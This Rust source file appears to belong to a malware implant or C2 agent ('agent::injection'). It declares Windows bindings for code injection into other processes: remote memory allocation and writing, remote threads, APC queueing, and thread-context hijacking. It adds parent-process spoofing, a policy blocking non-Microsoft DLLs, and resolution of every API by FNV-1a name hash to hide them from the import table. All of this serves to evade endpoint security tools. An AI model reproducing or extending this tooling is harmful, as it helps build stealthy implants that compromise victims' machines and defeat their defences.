// src/agent/injection/windows/bindings.rs
#![cfg(target_os = "windows")]

use std::ffi::c_void;

// --- TYPE DEFINITIONS ---
#[allow(non_camel_case_types)] pub type HANDLE = *mut c_void;
#[allow(non_camel_case_types)] pub type HMODULE = *mut c_void; 
#[allow(non_camel_case_types)] pub type LPVOID = *mut c_void;
#[allow(non_camel_case_types)] pub type BOOL = i32;
#[allow(non_camel_case_types)] pub type SIZE_T = usize;
#[allow(non_camel_case_types)] pub type DWORD = u32;
#[allow(non_camel_case_types)] pub type LPDWORD = *mut u32;
#[allow(non_camel_case_types)] pub type LPSTR = *mut i8;
#[allow(non_camel_case_types)] pub type LPCSTR = *const i8; // Added for LoadLibraryA
#[allow(non_camel_case_types)] pub type WORD = u16;
#[allow(non_camel_case_types)] pub type DWORD64 = u64;

// --- CONSTANTS ---
// All values are OS-fixed (winnt.h / WinBase.h). The common subset
// (PROCESS_ALL_ACCESS, MEM_*, PAGE_*, CREATE_SUSPENDED) is mirrored by
// config().ffi_windows; call sites read the typed config at runtime and
// these declarations remain as the canonical compile-time reference.
pub const PROCESS_ALL_ACCESS: u32 = 0x001F0FFF;
pub const MEM_COMMIT: u32 = 0x00001000;
pub const MEM_RESERVE: u32 = 0x00002000;
pub const PAGE_READWRITE: u32 = 0x04;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40; 
pub const CREATE_SUSPENDED: u32 = 0x00000004;
pub const EXTENDED_STARTUPINFO_PRESENT: u32 = 0x00080000;
pub const LIST_MODULES_ALL: u32 = 0x03; 

pub const TH32CS_SNAPTHREAD: u32 = 0x00000004;
pub const THREAD_SUSPEND_RESUME: u32 = 0x0002;
pub const THREAD_GET_CONTEXT: u32 = 0x0008;
pub const THREAD_SET_CONTEXT: u32 = 0x0010;
pub const THREAD_QUERY_INFORMATION: u32 = 0x0040;
pub const CONTEXT_CONTROL: u32 = 0x100001; 

pub const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
pub const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY: usize = 0x00020007;
pub const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 = 0x100000000000;

#[allow(dead_code)]
pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;

// --- STRUCTS ---

#[repr(C)]
pub struct MODULEINFO {
    pub lp_base_of_dll: LPVOID,
    pub size_of_image: DWORD,
    pub entry_point: LPVOID,
}

#[repr(C)]
pub struct STARTUPINFOA {
    pub cb: DWORD,
    pub lp_reserved: LPSTR,
    pub lp_desktop: LPSTR,
    pub lp_title: LPSTR,
    pub dw_x: DWORD,
    pub dw_y: DWORD,
    pub dw_x_size: DWORD,
    pub dw_y_size: DWORD,
    pub dw_x_count_chars: DWORD,
    pub dw_y_count_chars: DWORD,
    pub dw_fill_attribute: DWORD,
    pub dw_flags: DWORD,
    pub w_show_window: u16,
    pub cb_reserved2: u16,
    pub lp_reserved2: *mut u8,
    pub h_std_input: HANDLE,
    pub h_std_output: HANDLE,
    pub h_std_error: HANDLE,
}

#[repr(C)]
pub struct STARTUPINFOEXA {
    pub startup_info: STARTUPINFOA,
    pub lp_attribute_list: *mut c_void,
}

#[repr(C)]
pub struct PROCESS_INFORMATION {
    pub h_process: HANDLE,
    pub h_thread: HANDLE,
    pub dw_process_id: DWORD,
    pub dw_thread_id: DWORD,
}

#[repr(C)]
pub struct THREADENTRY32 {
    pub dw_size: DWORD,
    pub cnt_usage: DWORD,
    pub th32_thread_id: DWORD,
    pub th32_owner_process_id: DWORD,
    pub tp_base_pri: i32,
    pub tp_delta_pri: i32,
    pub dw_flags: DWORD,
}

#[repr(C, align(16))]
pub struct CONTEXT {
    pub p1_home: DWORD64, pub p2_home: DWORD64, pub p3_home: DWORD64, pub p4_home: DWORD64,
    pub p5_home: DWORD64, pub p6_home: DWORD64,
    pub context_flags: DWORD, pub mx_csr: DWORD,
    pub seg_cs: WORD, pub seg_ds: WORD, pub seg_es: WORD, pub seg_fs: WORD, pub seg_gs: WORD, pub seg_ss: WORD,
    pub eflags: DWORD,
    pub dr0: DWORD64, pub dr1: DWORD64, pub dr2: DWORD64, pub dr3: DWORD64, pub dr6: DWORD64, pub dr7: DWORD64,
    pub rax: DWORD64, pub rcx: DWORD64, pub rdx: DWORD64, pub rbx: DWORD64, pub rsp: DWORD64, pub rbp: DWORD64,
    pub rsi: DWORD64, pub rdi: DWORD64, pub r8: DWORD64, pub r9: DWORD64, pub r10: DWORD64, pub r11: DWORD64,
    pub r12: DWORD64, pub r13: DWORD64, pub r14: DWORD64, pub r15: DWORD64, pub rip: DWORD64,
    pub float_save: [u8; 512], pub vector_reg: [u8; 512],
    pub vector_control: DWORD64, pub debug_control: DWORD64,
    pub last_branch_to_rip: DWORD64, pub last_branch_from_rip: DWORD64,
    pub last_exception_to_rip: DWORD64, pub last_exception_from_rip: DWORD64,
}

// --- IMPORTS ---

/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) -> HANDLE {
    type F = unsafe extern "system" fn(DWORD, BOOL, DWORD) -> HANDLE;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenProcess")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(dwDesiredAccess, bInheritHandle, dwProcessId) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn VirtualAlloc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID {
    type F = unsafe extern "system" fn(LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualAlloc")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(lpAddress, dwSize, flAllocationType, flProtect) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn VirtualAllocEx(h: HANDLE, lp: LPVOID, dw: SIZE_T, fl: DWORD, flP: DWORD) -> LPVOID {
    type F = unsafe extern "system" fn(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualAllocEx")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(h, lp, dw, fl, flP) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn WriteProcessMemory(h: HANDLE, lp: LPVOID, b: *const c_void, n: SIZE_T, w: *mut SIZE_T) -> BOOL {
    type F = unsafe extern "system" fn(HANDLE, LPVOID, *const c_void, SIZE_T, *mut SIZE_T) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"WriteProcessMemory")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(h, lp, b, n, w) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn ReadProcessMemory(h: HANDLE, lp: LPVOID, b: *mut c_void, n: SIZE_T, w: *mut SIZE_T) -> BOOL {
    type F = unsafe extern "system" fn(HANDLE, LPVOID, *mut c_void, SIZE_T, *mut SIZE_T) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ReadProcessMemory")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(h, lp, b, n, w) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: LPDWORD) -> BOOL {
    type F = unsafe extern "system" fn(LPVOID, SIZE_T, DWORD, LPDWORD) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualProtect")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(lpAddress, dwSize, flNewProtect, lpflOldProtect) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn VirtualProtectEx(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: LPDWORD) -> BOOL {
    type F = unsafe extern "system" fn(HANDLE, LPVOID, SIZE_T, DWORD, LPDWORD) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualProtectEx")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn QueueUserAPC(pfnAPC: *const c_void, hThread: HANDLE, dwData: usize) -> DWORD {
    type F = unsafe extern "system" fn(*const c_void, HANDLE, usize) -> DWORD;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"QueueUserAPC")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(pfnAPC, hThread, dwData) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn ResumeThread(hThread: HANDLE) -> DWORD {
    type F = unsafe extern "system" fn(HANDLE) -> DWORD;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ResumeThread")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hThread) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn SuspendThread(hThread: HANDLE) -> DWORD {
    type F = unsafe extern "system" fn(HANDLE) -> DWORD;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"SuspendThread")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hThread) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn GetThreadContext(hThread: HANDLE, lpContext: *mut CONTEXT) -> BOOL {
    type F = unsafe extern "system" fn(HANDLE, *mut CONTEXT) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetThreadContext")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hThread, lpContext) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn SetThreadContext(hThread: HANDLE, lpContext: *const CONTEXT) -> BOOL {
    type F = unsafe extern "system" fn(HANDLE, *const CONTEXT) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"SetThreadContext")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hThread, lpContext) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn CloseHandle(h: HANDLE) -> BOOL {
    type F = unsafe extern "system" fn(HANDLE) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CloseHandle")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(h) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn CreateProcessA(lpAppName: LPSTR, lpCmdLine: LPSTR, lpProcAttr: *mut c_void, lpThreadAttr: *mut c_void, bInherit: BOOL, dwFlags: DWORD, lpEnv: *mut c_void, lpDir: LPSTR, lpStartup: *mut STARTUPINFOA, lpProcInfo: *mut PROCESS_INFORMATION) -> BOOL {
    type F = unsafe extern "system" fn(LPSTR, LPSTR, *mut c_void, *mut c_void, BOOL, DWORD, *mut c_void, LPSTR, *mut STARTUPINFOA, *mut PROCESS_INFORMATION) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateProcessA")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(lpAppName, lpCmdLine, lpProcAttr, lpThreadAttr, bInherit, dwFlags, lpEnv, lpDir, lpStartup, lpProcInfo) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) -> HANDLE {
    type F = unsafe extern "system" fn(DWORD, DWORD) -> HANDLE;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateToolhelp32Snapshot")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(dwFlags, th32ProcessID) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn Thread32First(hSnapshot: HANDLE, lpte: *mut THREADENTRY32) -> BOOL {
    type F = unsafe extern "system" fn(HANDLE, *mut THREADENTRY32) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"Thread32First")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hSnapshot, lpte) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn Thread32Next(hSnapshot: HANDLE, lpte: *mut THREADENTRY32) -> BOOL {
    type F = unsafe extern "system" fn(HANDLE, *mut THREADENTRY32) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"Thread32Next")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hSnapshot, lpte) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn OpenThread(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwThreadId: DWORD) -> HANDLE {
    type F = unsafe extern "system" fn(DWORD, BOOL, DWORD) -> HANDLE;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenThread")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(dwDesiredAccess, bInheritHandle, dwThreadId) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn GetLastError() -> DWORD {
    type F = unsafe extern "system" fn() -> DWORD;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetLastError")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f() }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn CreateThread(lpThreadAttributes: *mut c_void, dwStackSize: SIZE_T, lpStartAddress: LPVOID, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPDWORD) -> HANDLE {
    type F = unsafe extern "system" fn(*mut c_void, SIZE_T, LPVOID, LPVOID, DWORD, LPDWORD) -> HANDLE;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateThread")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn CreateRemoteThread(hProcess: HANDLE, lpThreadAttributes: *mut c_void, dwStackSize: SIZE_T, lpStartAddress: LPVOID, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPDWORD) -> HANDLE {
    type F = unsafe extern "system" fn(HANDLE, *mut c_void, SIZE_T, LPVOID, LPVOID, DWORD, LPDWORD) -> HANDLE;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateRemoteThread")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn WaitForSingleObject(hHandle: HANDLE, dwMilliseconds: DWORD) -> DWORD {
    type F = unsafe extern "system" fn(HANDLE, DWORD) -> DWORD;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"WaitForSingleObject")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hHandle, dwMilliseconds) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn InitializeProcThreadAttributeList(lpAttributeList: *mut c_void, dwAttributeCount: DWORD, dwFlags: DWORD, lpSize: *mut SIZE_T) -> BOOL {
    type F = unsafe extern "system" fn(*mut c_void, DWORD, DWORD, *mut SIZE_T) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"InitializeProcThreadAttributeList")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(lpAttributeList, dwAttributeCount, dwFlags, lpSize) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn UpdateProcThreadAttribute(lpAttributeList: *mut c_void, dwFlags: DWORD, Attribute: usize, lpValue: *const c_void, cbSize: SIZE_T, lpPreviousValue: *mut c_void, lpReturnSize: *mut SIZE_T) -> BOOL {
    type F = unsafe extern "system" fn(*mut c_void, DWORD, usize, *const c_void, SIZE_T, *mut c_void, *mut SIZE_T) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"UpdateProcThreadAttribute")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(lpAttributeList, dwFlags, Attribute, lpValue, cbSize, lpPreviousValue, lpReturnSize) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn DeleteProcThreadAttributeList(lpAttributeList: *mut c_void) {
    type F = unsafe extern "system" fn(*mut c_void);
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"DeleteProcThreadAttributeList")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(lpAttributeList) };
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn GetModuleHandleA(lpModuleName: LPSTR) -> HANDLE {
    type F = unsafe extern "system" fn(LPSTR) -> HANDLE;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetModuleHandleA")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(lpModuleName) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn LoadLibraryA(lpLibFileName: LPCSTR) -> HMODULE {
    type F = unsafe extern "system" fn(LPCSTR) -> HMODULE;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"LoadLibraryA")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(lpLibFileName) }
}
/// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
pub unsafe fn GetProcAddress(hModule: HMODULE, lpProcName: LPCSTR) -> LPVOID {
    type F = unsafe extern "system" fn(HMODULE, LPCSTR) -> LPVOID;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetProcAddress")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hModule, lpProcName) }
}

// PSAPI Imports
/// Lazily resolved from psapi.dll by name hash (import-table hygiene).
pub unsafe fn EnumProcessModulesEx(hProcess: HANDLE, lphModule: *mut HMODULE, cb: DWORD, lpcbNeeded: *mut DWORD, dwFilterFlag: DWORD) -> BOOL {
    type F = unsafe extern "system" fn(HANDLE, *mut HMODULE, DWORD, *mut DWORD, DWORD) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"psapi.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"EnumProcessModulesEx")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hProcess, lphModule, cb, lpcbNeeded, dwFilterFlag) }
}
/// Lazily resolved from psapi.dll by name hash (import-table hygiene).
pub unsafe fn GetModuleBaseNameA(hProcess: HANDLE, hModule: HMODULE, lpBaseName: LPSTR, nSize: DWORD) -> DWORD {
    type F = unsafe extern "system" fn(HANDLE, HMODULE, LPSTR, DWORD) -> DWORD;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"psapi.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetModuleBaseNameA")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hProcess, hModule, lpBaseName, nSize) }
}
/// Lazily resolved from psapi.dll by name hash (import-table hygiene).
pub unsafe fn GetModuleInformation(hProcess: HANDLE, hModule: HMODULE, lpmodinfo: *mut MODULEINFO, cb: DWORD) -> BOOL {
    type F = unsafe extern "system" fn(HANDLE, HMODULE, *mut MODULEINFO, DWORD) -> BOOL;
    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let p = *P.get_or_init(||
        crate::agent::injection::win_resolve::resolve_ptr(
            b"psapi.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetModuleInformation")));
    let f: F = unsafe { std::mem::transmute(p) };
    unsafe { f(hProcess, hModule, lpmodinfo, cb) }
}
